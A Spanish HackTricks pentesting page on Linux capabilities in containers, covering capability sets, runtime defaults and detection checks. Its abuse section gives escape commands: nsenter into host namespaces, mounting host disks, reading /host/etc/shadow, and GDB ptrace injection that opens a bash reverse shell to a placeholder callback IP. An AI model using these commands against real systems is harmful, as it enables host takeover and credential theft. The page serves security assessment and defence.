# Capabilities de Linux en Contenedores

{{#include ../../../../banners/hacktricks-training.md}}

## Descripción general

Las capabilities de Linux son uno de los componentes más importantes de la seguridad de los contenedores porque responden a una pregunta sutil pero fundamental: **¿qué significa realmente "root" dentro de un contenedor?** En un sistema Linux normal, el UID 0 históricamente implicaba un conjunto de privilegios muy amplio. En los kernels modernos, ese privilegio se divide en unidades más pequeñas llamadas capabilities. Un proceso puede ejecutarse como root y aun así carecer de muchas operaciones potentes si se han eliminado las capabilities relevantes. <sup>[[1]](#references)</sup>

Los contenedores dependen mucho de esta distinción. Muchas cargas de trabajo todavía se ejecutan como UID 0 dentro del contenedor por razones de compatibilidad o simplicidad. Sin la eliminación de capabilities, esto sería demasiado peligroso. Al eliminarlas, un proceso root dentro de un contenedor todavía puede realizar muchas tareas habituales dentro del contenedor, mientras se le deniegan operaciones más sensibles del kernel. Por eso, que un shell de un contenedor muestre `uid=0(root)` no significa automáticamente "root del host" ni siquiera "privilegios amplios sobre el kernel". Los conjuntos de capabilities determinan cuánto vale realmente esa identidad root.

Para consultar la referencia completa de las capabilities de Linux y muchos ejemplos de abuso, consulta:

{{#ref}}
../../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## Funcionamiento

Las capabilities se controlan en varios conjuntos, incluidos los conjuntos permitted, effective, inheritable, ambient y bounding. Para muchas evaluaciones de contenedores, la semántica exacta del kernel de cada conjunto es menos importante inicialmente que la pregunta práctica final: **¿qué operaciones privilegiadas puede realizar correctamente este proceso ahora mismo y qué posibles aumentos de privilegios futuros siguen siendo posibles?** <sup>[[1]](#references)</sup>

Esto es importante porque muchas técnicas de breakout son en realidad problemas relacionados con capabilities disfrazados de problemas de contenedores. Una carga de trabajo con `CAP_SYS_ADMIN` puede acceder a una enorme cantidad de funcionalidades del kernel que un proceso root normal dentro de un contenedor no debería tocar. Una carga de trabajo con `CAP_NET_ADMIN` se vuelve mucho más peligrosa si también comparte el namespace de red del host. Una carga de trabajo con `CAP_SYS_PTRACE` se vuelve mucho más interesante si puede ver procesos del host mediante el uso compartido del PID del host. En Docker o Podman, esto puede aparecer como `--pid=host`; en Kubernetes, normalmente aparece como `hostPID: true`.

En otras palabras, el conjunto de capabilities no se puede evaluar de forma aislada. Debe analizarse junto con los namespaces, seccomp y la política MAC.

## Laboratorio

Una forma muy directa de inspeccionar las capabilities dentro de un contenedor es:
```bash
docker run --rm -it debian:stable-slim bash
apt-get update && apt-get install -y libcap2-bin
capsh --print
```
También puedes comparar un contenedor más restrictivo con uno al que se le hayan añadido todas las capacidades:
```bash
docker run --rm debian:stable-slim sh -c 'grep CapEff /proc/self/status'
docker run --rm --cap-add=ALL debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Para ver el efecto de una adición limitada, prueba a eliminarlo todo y volver a añadir únicamente una capability:
```bash
docker run --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Estos pequeños experimentos ayudan a demostrar que un runtime no se limita a activar o desactivar un booleano llamado "privileged". Está definiendo la superficie de privilegios real disponible para el proceso.

## Capabilities de alto riesgo

Las capabilities solo se convierten en primitivas de escape cuando su operación alcanza un **recurso gobernado por el host**. Las combinaciones recurrentes de alto riesgo son:

- **`CAP_SYS_ADMIN`** junto con un PID del host, un dispositivo de bloques o una ruta de control del kernel con permisos de escritura. Unirse a un mount namespace objetivo requiere además **`CAP_SYS_CHROOT`**; montar un filesystem basado en bloques requiere **`CAP_SYS_ADMIN`** en el initial user namespace.
- **`CAP_SYS_PTRACE`** junto con visibilidad de los PIDs del host y un proceso del host al que se pueda hacer attach. **`CAP_SYS_ADMIN`** no es necesario para la inyección mediante ptrace.
- **`CAP_DAC_OVERRIDE` o `CAP_DAC_READ_SEARCH`** junto con un filesystem del host accesible. Estas capabilities omiten comprobaciones DAC diferentes, pero no crean una vista del filesystem del host.
- **`CAP_SYS_MODULE`** en el initial user namespace junto con un módulo aceptado y compatible con el kernel. Los contenedores Linux normales comparten el kernel del nodo; los runtimes basados en VM o en userspace-kernel cambian ese límite.
- **`CAP_MKNOD`** en el initial user namespace junto con un dispositivo real del host que el device cgroup ya permita. Crear un nodo no omite el device cgroup.
- **`CAP_SYS_RAWIO`** junto con una interfaz de memoria, puertos de I/O, PCI o control de dispositivos expuesta y utilizable.
- **`CAP_SYS_BOOT`** junto con el initial PID namespace para reiniciar el host, o una ruta kexec utilizable y permitida para reemplazar el kernel.
- **`CAP_NET_ADMIN`** en el host network namespace para controlar directamente el estado de red del nodo. **`CAP_NET_RAW`** puede participar en un escape específico de protocolo, pero los raw sockets por sí solos no proporcionan un shell en el nodo.

`CAP_SYS_CHROOT` no aparece deliberadamente como una capability de escape independiente. Puede ser necesaria para `setns()` de un mount namespace y puede facilitar el uso de un árbol del host ya accesible, pero `chroot()` por sí solo ni expone ese árbol ni concede nuevos permisos sobre el filesystem. Del mismo modo, `CAP_BPF` y `CAP_PERFMON` exponen una potente superficie de telemetría y ataque del kernel, pero, en ausencia de un fallo independiente del kernel, sus operaciones normales no son escapes genéricos de contenedores.

## Uso en runtimes

Docker, Podman, los stacks basados en containerd y CRI-O utilizan controles de capabilities, pero sus valores predeterminados y sus interfaces de gestión difieren. Docker las expone directamente mediante flags como `--cap-drop` y `--cap-add`. Podman ofrece controles similares y normalmente los combina con ejecución rootless como capa de seguridad adicional. Kubernetes expone las adiciones y eliminaciones de capabilities mediante el `securityContext` del Pod o del contenedor; los runtimes de nivel inferior expresan los conjuntos resultantes en la configuración del runtime OCI. Los entornos de system containers, como LXC e Incus, también dependen del control de capabilities, pero su integración más amplia con el host puede tentar a los operadores a relajar los valores predeterminados de forma más agresiva que en un contenedor de aplicación. <sup>[[2]](#references)</sup> <sup>[[3]](#references)</sup> <sup>[[4]](#references)</sup> <sup>[[5]](#references)</sup> <sup>[[6]](#references)</sup>

El mismo principio se aplica a todos ellos: que una capability pueda concederse técnicamente no significa necesariamente que deba concederse. Muchos incidentes reales comienzan cuando un operador añade una capability simplemente porque un workload falló con una configuración más restrictiva y el equipo necesitaba una solución rápida.

## Configuraciones incorrectas

El error más evidente es **`--cap-add=ALL`** en las CLIs de estilo Docker/Podman, pero no es el único. En la práctica, un problema más común es conceder una o dos capabilities extremadamente potentes, especialmente `CAP_SYS_ADMIN`, para "hacer que la aplicación funcione", sin comprender también las implicaciones relacionadas con namespaces, seccomp y mounts. Otro modo de fallo común es combinar capabilities adicionales con el uso compartido de namespaces del host. En Docker o Podman esto puede aparecer como `--pid=host`, `--network=host` o `--userns=host`; en Kubernetes, la exposición equivalente suele aparecer mediante configuraciones del workload como `hostPID: true` o `hostNetwork: true`. Cada una de esas combinaciones cambia aquello que la capability puede afectar realmente.

También es común que los administradores crean que, como un workload no es completamente `--privileged`, sigue estando limitado de forma significativa. A veces es cierto, pero en ocasiones la postura efectiva ya está lo bastante cerca de privileged como para que la distinción deje de importar operativamente.

## Abuso

Empieza registrando los conjuntos efectivos, el mapeo del user namespace, el estado de seccomp, los namespaces, los mounts y los dispositivos. Un nombre de capability sin este contexto no demuestra un escape:
```bash
capsh --print
grep -E 'Cap(Inh|Prm|Eff|Bnd|Amb)|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map /proc/self/gid_map
ls -l /proc/self/ns
findmnt
```
### `CAP_SYS_ADMIN`: namespaces y dispositivos de bloque

Con la visibilidad de los PID del host, `CAP_SYS_ADMIN` puede entrar en los namespaces del host. La operación del mount namespace también requiere `CAP_SYS_CHROOT` en el user namespace del proceso que la invoca.

**Comprueba la capability y el confinamiento:**
```bash
capsh --print | grep -E 'cap_sys_admin|cap_sys_chroot'
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map /proc/self/gid_map
```
**Enumera el objetivo:** confirma el uso compartido del PID del host a partir de la configuración del contenedor/Pod o de una lista inequívoca de procesos del host; después, inspecciona los namespaces del objetivo. También existe un PID 1 local en los namespaces de PID privados, por lo que su sola presencia no demuestra el uso compartido de los PID del host.
```bash
ps -eo pid,user,comm,args
target_pid=1
tr '\0' ' ' <"/proc/${target_pid}/cmdline"; echo
ls -l "/proc/${target_pid}/ns/"{mnt,pid,net,ipc,uts,user}
```
**Explotar la ruta del namespace:**
```bash
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/sh
id
findmnt /
```
Las comprobaciones de capabilities deben realizarse correctamente en los user namespaces que poseen los objetivos. `--pid=host` o `hostPID: true` en Kubernetes proporcionan visibilidad; no proporcionan las capabilities.

Para la ruta alternativa de dispositivos de bloques, **enumera** los candidatos y, a continuación, **explota** el filesystem accesible montando primero el candidato validado en modo de solo lectura:
```bash
lsblk -o NAME,PATH,TYPE,SIZE,FSTYPE,MOUNTPOINTS
node_root_device=/dev/vda1  # Replace with the validated candidate.
mkdir -p /mnt/hostdisk
mount -o ro "${node_root_device}" /mnt/hostdisk
cat /mnt/hostdisk/etc/hostname
umount /mnt/hostdisk
```
El nodo de dispositivo debe existir, el cgroup de dispositivos debe permitirlo y los montajes de sistemas de archivos de bloques requieren `CAP_SYS_ADMIN` en el namespace de usuario inicial. Un root del host ya montado mediante bind en `/host` proporciona acceso al host **sin** `CAP_SYS_ADMIN`; `chroot /host` solo es una comodidad y requiere `CAP_SYS_CHROOT` por separado.

### Root del host accesible: ejecución directa del sistema de archivos

Si el root del host ya está montado en `/host`, confirma primero el montaje y, a continuación, usa directamente el acceso existente. Esta ruta no depende de `CAP_SYS_ADMIN`:
```bash
findmnt -T /host -o TARGET,SOURCE,FSTYPE,OPTIONS
ls -la /host
chroot /host /bin/bash
```
Si `chroot()` no está disponible, pero el binario del host es compatible con la arquitectura y el loader del contenedor, a menudo se puede invocar a través del árbol montado:
```bash
/host/bin/bash -p
export PATH=/host/usr/sbin:/host/usr/bin:/host/sbin:/host/bin:$PATH
```
Las lecturas y escrituras directas en `/host` ya constituyen un compromiso del sistema de archivos del host. `chroot()` o ejecutar un binario del host solo hacen que ese acceso sea más conveniente; ninguna de las dos operaciones crea el mount del host ni evita un mount de solo lectura o una política MAC.

### `CAP_SYS_PTRACE`: host-process injection

Con visibilidad de los PID del host y `CAP_SYS_PTRACE` en el user namespace del objetivo, GDB puede hacer que un proceso aprobado del host llame a `system()`. No se requiere `CAP_SYS_ADMIN`.

**Comprueba la capability y los controles de attachment:**
```bash
capsh --print | grep cap_sys_ptrace
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null
```
**Enumera y selecciona un objetivo desechable:** confirma el uso compartido del PID del host mediante la configuración o una lista inequívoca de procesos del nodo; nunca selecciones el PID 1 ni un daemon crítico.
```bash
ps -eo pid,user,comm,args
target_pid=<approved-lab-process-pid>
readlink "/proc/${target_pid}/exe"
grep -E '^(Name|Uid|Gid|TracerPid|NoNewPrivs|Seccomp):' \
"/proc/${target_pid}/status"
```
**Exploit el proceso seleccionado:**
```bash
# On a reachable assessment system:
nc -lvnp 4444

# In the container:
callback_ip=192.0.2.10
callback_port=4444
gdb -q -nx -batch -p "${target_pid}" \
-ex "call (int) system(\"bash -c 'bash -i >& /dev/tcp/${callback_ip}/${callback_port} 0>&1'\")" \
-ex detach
```
El objetivo debe permitir el attach y tener un símbolo `system()` utilizable y una ruta de payload de Bash. Yama, el estado `non-dumpable`, seccomp, los user namespaces y la política MAC pueden bloquear la cadena. GDB detiene el objetivo mientras está adjunto, así que usa únicamente un proceso de laboratorio desechable.

### `CAP_DAC_OVERRIDE` y `CAP_DAC_READ_SEARCH`: archivos protegidos del host

Estas capabilities no exponen el filesystem del host. Si `/host` ya es un mount del host, `CAP_DAC_READ_SEARCH` puede omitir las comprobaciones DAC de lectura/búsqueda y `CAP_DAC_OVERRIDE` puede omitir adicionalmente las comprobaciones de escritura ordinarias:

**Comprueba las capabilities:**
```bash
capsh --print | grep -E 'cap_dac_override|cap_dac_read_search'
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
```
**Enumera el sistema de archivos del host expuesto y los permisos del objetivo:**
```bash
findmnt -T /host -o TARGET,SOURCE,FSTYPE,OPTIONS
stat -c 'owner=%u:%g mode=%A path=%n' \
/host/etc/shadow /host/root /host/var/lib/kubelet 2>/dev/null
find /host/var/lib/kubelet -maxdepth 3 -type f -readable -ls 2>/dev/null | head
```
**Prueba los bypasses de lectura y escritura** en un laboratorio desechable:
```bash
head -n 1 /host/etc/shadow
printf 'DAC proof from uid=%s\n' "$(id -u)" >/host/root/ht-dac-proof
rm /host/root/ht-dac-proof
```
Un mount de solo lectura y las reglas de LSM siguen aplicándose. `CAP_DAC_READ_SEARCH` también autoriza `open_by_handle_at()`, pero un breakout como Shocker necesita además un descriptor de archivo de mount para el mismo sistema de archivos subyacente, handles válidos o descubribles, un sistema de archivos/disposición de almacenamiento compatible y que no exista ningún bloqueo del runtime o de LSM. No proporciona acceso arbitrario a todos los sistemas de archivos fuera del namespace de mount.

### `CAP_SYS_MODULE`: ejecución en el kernel compartido

En un contenedor Linux ordinario, un módulo aceptado se ejecuta en el kernel compartido del host.

**Comprueba la capability y el alcance del user namespace:**
```bash
capsh --print | grep cap_sys_module
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```
**Enumera los requisitos previos para la carga de módulos:**
```bash
uname -r
cat /proc/sys/kernel/modules_disabled
cat /sys/kernel/security/lockdown 2>/dev/null
grep -E 'CONFIG_MODULES=|CONFIG_MODULE_SIG(_FORCE)?=' \
"/boot/config-$(uname -r)" 2>/dev/null
modinfo /lab/ht-proof.ko
```
**Exploit únicamente con un módulo de prueba compatible y revisado previamente en un nodo desechable:**
```bash
insmod /lab/ht-proof.ko
grep '^ht_proof ' /proc/modules
rmmod ht_proof
```
La capability debe estar activa en el user namespace inicial. La versión y configuración del kernel, las firmas de módulos, el lockdown, seccomp y la política de LSM deben permitir la carga. Kata, gVisor, el aislamiento de Hyper-V y runtimes similares cambian el límite del kernel que alcanza la workload.

### `CAP_MKNOD`: crear un handle de dispositivo permitido

`CAP_MKNOD` crea un nodo de dispositivo, pero no omite el device cgroup. La creación de dispositivos no está sujeta a namespaces, por lo que la capability debe estar activa en el user namespace inicial.

**Comprueba la capability y el alcance del user namespace:**
```bash
capsh --print | grep cap_mknod
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```
**Enumera los dispositivos reales, sus números major/minor y cualquier allowlist de cgroup-v1 visible:**
```bash
lsblk -o NAME,PATH,TYPE,SIZE,FSTYPE,MOUNTPOINTS 2>/dev/null
for device_file in /sys/class/block/*/dev; do
printf '%s %s\n' "${device_file}" "$(cat "${device_file}")"
done
cat /sys/fs/cgroup/devices/devices.list 2>/dev/null
```
**Exploit un candidato ext-family validado de solo lectura:**
```bash
node_block_name=vda1                       # Replace with the validated candidate.
device_numbers=$(cat "/sys/class/block/${node_block_name}/dev")
device_major=${device_numbers%:*}
device_minor=${device_numbers#*:}
mknod /dev/ht-node-root b "${device_major}" "${device_minor}"
debugfs -R 'cat /etc/hostname' /dev/ht-node-root
rm /dev/ht-node-root
```
Otros sistemas de archivos necesitan una herramienta de solo lectura equivalente; montar el dispositivo también requiere `CAP_SYS_ADMIN`. `Operation not permitted` al abrir el nodo creado suele indicar que el cgroup de dispositivos todavía lo bloquea. En cgroup v2, el acceso a dispositivos suele aplicarse con BPF y no existe ningún archivo `devices.list`, por lo que una apertura exitosa es la prueba decisiva.

### `CAP_SYS_RAWIO`: interfaz de raw-I/O expuesta

No existe un payload genérico portable: las direcciones válidas y los efectos dependen del hardware y de la configuración del kernel.

**Comprueba la capability y el ámbito del user namespace:**
```bash
capsh --print | grep cap_sys_rawio
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```
**Enumera las interfaces raw, el hardware y los drivers expuestos:**
```bash
ls -l /dev/mem /dev/port 2>/dev/null
lspci -nnk 2>/dev/null
find /sys/bus/pci/devices -maxdepth 2 -name 'resource*' -ls 2>/dev/null
```
**Exploit solo con una prueba aprobada para el dispositivo y el rango de direcciones identificados.** Si `/dev/mem` es la interfaz aprobada para el laboratorio, esta plantilla demuestra la divulgación de memoria del nodo sin imprimir su contenido:
```bash
approved_physical_address=<lab-provided-decimal-address>
approved_byte_count=<lab-provided-size>
dd if=/dev/mem of=/tmp/ht-rawio-proof.bin bs=1 \
skip="${approved_physical_address}" count="${approved_byte_count}" status=none
wc -c /tmp/ht-rawio-proof.bin
sha256sum /tmp/ht-rawio-proof.bin
rm /tmp/ht-rawio-proof.bin
```
La dirección debe provenir del mapa de hardware del lab, porque leer algunas regiones MMIO puede tener efectos secundarios. Un comando genérico de escritura en memoria sería engañoso e inseguro: la misma dirección puede ser inofensiva en una máquina y controlar hardware o memoria del kernel en otra. Los cgroups de dispositivos, los permisos del sistema de archivos, `/dev/mem` estricto, el kernel lockdown, la virtualización y la política de LSM suelen impedir un acceso útil.

### `CAP_SYS_BOOT`: reinicio del namespace o reemplazo del kernel

En un namespace de PID privado, `reboot()` termina el proceso init de ese namespace en lugar de reiniciar el host. Por tanto, el impacto de reiniciar el host requiere el namespace de PID inicial, normalmente mediante el uso compartido de los PID del host. Una ruta de kexec también necesita una imagen de kernel compatible y una política de lockdown/firmas permisiva:

**Comprueba la capability:**
```bash
capsh --print | grep cap_sys_boot
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```
**Enumera los prerrequisitos de PID namespace y kexec:** confirma el uso compartido del PID del host en la configuración de la carga de trabajo, porque un enlace a un PID namespace por sí solo no revela si es el namespace inicial del nodo.
```bash
ps -p 1 -o pid,user,comm,args
readlink /proc/self/ns/pid
command -v kexec 2>/dev/null
cat /sys/kernel/security/lockdown 2>/dev/null
```
**Exploit solo cuando reiniciar un nodo de laboratorio desechable sea el ejercicio explícito:**
```bash
sync
reboot -f
```
No ejecutes ese comando ni cargues un kernel en un nodo compartido simplemente para demostrar la capacidad. En un PID namespace privado, solo termina el proceso init de ese namespace y no demuestra ningún impacto en el host.

### `CAP_NET_ADMIN` y `CAP_NET_RAW`: rutas de red del host

`CAP_NET_ADMIN` solo afecta al network namespace actual.

**Comprueba las capabilities y el confinamiento:**
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
```
**Enumera la red actual y confirma la red del host a partir de la configuración de la carga de trabajo:**
```bash
readlink /proc/self/ns/net
ip -brief address
ip route
nft list ruleset 2>/dev/null || iptables-save 2>/dev/null
```
**Ejercicio `CAP_NET_ADMIN` de manera reversible:** con networking del host, la interfaz temporal es una interfaz del nodo.
```bash
ip link add ht-net-admin-proof type dummy
ip addr add 192.0.2.1/32 dev ht-net-admin-proof
ip link set ht-net-admin-proof up
ip -brief addr show ht-net-admin-proof
ip link delete ht-net-admin-proof
```
`CAP_NET_RAW` permite sockets RAW y PACKET, pero no es un shell genérico del host. Para **enumerar** la cadena documentada de GCE, comprueba la ruta de metadata y captura si el tráfico del guest-agent en texto plano es observable:
```bash
ip route get 169.254.169.254
tcpdump -ni any -c 20 'host 169.254.169.254'
```
Si existen los prerrequisitos correspondientes, **exploit** la cadena específica del entorno tal como se documenta en [GCP - Network Docker Escape](https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/gcp-privilege-escalation/gcp-network-docker-escape.html): captura el estado de la solicitud y de la secuencia, inyecta la respuesta de metadata falsificada que contiene una clave SSH y, a continuación, valida el acceso al host. La cadena requería root, networking del host, `CAP_NET_ADMIN`, `CAP_NET_RAW`, tráfico de metadata de GCE en texto plano y una solicitud del guest-agent susceptible a una race condition; el transporte o el comportamiento del agente modernos pueden interrumpirla.

## Comprobaciones

El objetivo de las comprobaciones de capabilities no es únicamente volcar valores sin procesar, sino comprender si el proceso tiene privilegios suficientes para que su namespace actual y la situación de sus montajes resulten peligrosos.
```bash
capsh --print                    # Human-readable capability sets and securebits
grep '^Cap' /proc/self/status    # Raw kernel capability bitmasks
```
Lo interesante aquí:

- `capsh --print` es la forma más sencilla de detectar capabilities de alto riesgo, como `cap_sys_admin`, `cap_sys_ptrace`, `cap_net_admin` o `cap_sys_module`.
- La línea `CapEff` en `/proc/self/status` indica qué capabilities son realmente efectivas ahora, no solo cuáles podrían estar disponibles en otros conjuntos.
- Un volcado de capabilities se vuelve mucho más importante si el contenedor también comparte los namespaces de PID, red o usuario del host, o tiene montajes del host con permisos de escritura.

Después de recopilar la información sin procesar sobre las capabilities, el siguiente paso es interpretarla. Hay que comprobar si el proceso es root, si los user namespaces están activos, si se comparten namespaces del host, si seccomp está aplicando restricciones y si AppArmor o SELinux todavía limitan el proceso. Un conjunto de capabilities por sí solo es solo una parte de la historia, pero a menudo es la parte que explica por qué un container breakout funciona y otro falla con el mismo punto de partida aparente.

## Valores predeterminados del runtime

| Runtime / plataforma | Estado predeterminado | Comportamiento predeterminado | Debilitamiento manual habitual |
| --- | --- | --- | --- |
| Docker Engine | Conjunto de capabilities reducido por defecto | Docker mantiene una allowlist predeterminada de capabilities y elimina el resto | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--cap-add=ALL`, `--privileged` |
| Podman | Conjunto de capabilities reducido por defecto | Los contenedores de Podman no tienen privilegios por defecto y utilizan un modelo de capabilities reducido | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--privileged` |
| Kubernetes | Hereda los valores predeterminados del runtime salvo que se modifiquen | Si no se especifica `securityContext.capabilities`, el contenedor obtiene el conjunto de capabilities predeterminado del runtime | `securityContext.capabilities.add`, no establecer `drop: [\"ALL\"]`, `privileged: true` |
| containerd / CRI-O bajo Kubernetes | Normalmente, el valor predeterminado del runtime | El conjunto efectivo depende del runtime y de la especificación del Pod | igual que en la fila de Kubernetes; la configuración directa de OCI/CRI también puede añadir capabilities explícitamente |

En Kubernetes, el punto importante es que la API no define un único conjunto universal de capabilities predeterminado. Si el Pod no añade ni elimina capabilities, la carga de trabajo hereda el valor predeterminado del runtime de ese nodo.

## References

- [1] [capabilities(7) - página del manual de Linux](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [2] [Open Container Initiative - configuración de contenedores Linux](https://github.com/opencontainers/runtime-spec/blob/main/config-linux.md#process)
- [3] [Docker Docs - privilegios del runtime y capabilities de Linux](https://docs.docker.com/engine/containers/run/#runtime-privilege-and-linux-capabilities)
- [4] [Kubernetes Documentation - establecer capabilities para un contenedor](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/#set-capabilities-for-a-container)
- [5] [documentación de Podman - `--cap-add` y `--cap-drop`](https://docs.podman.io/en/latest/markdown/podman-run.1.html#cap-add-capability)
- [6] [documentación de Incus - seguridad](https://linuxcontainers.org/incus/docs/main/explanation/security/)
{{#include ../../../../banners/hacktricks-training.md}}
